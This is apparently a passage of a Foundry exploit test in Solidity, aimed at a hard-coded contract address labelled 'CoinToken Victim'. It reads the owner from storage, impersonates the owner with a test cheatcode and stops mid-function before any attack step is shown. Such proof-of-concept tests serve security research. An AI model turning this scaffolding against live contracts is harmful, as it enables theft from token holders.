interface IPausable {
    function unpause() external;
    function paused() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        vm.label(TARGET, "CoinToken Victim");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Read the current owner address from storage slot 1
        address currentOwner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(1))))));

        // Record initial balance
        uint256 initialBalance = ICoinToken(TARGET).balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(currentOwner);

        // Try to unpause in case contract is paused (will revert silently if already unpaused or fails)
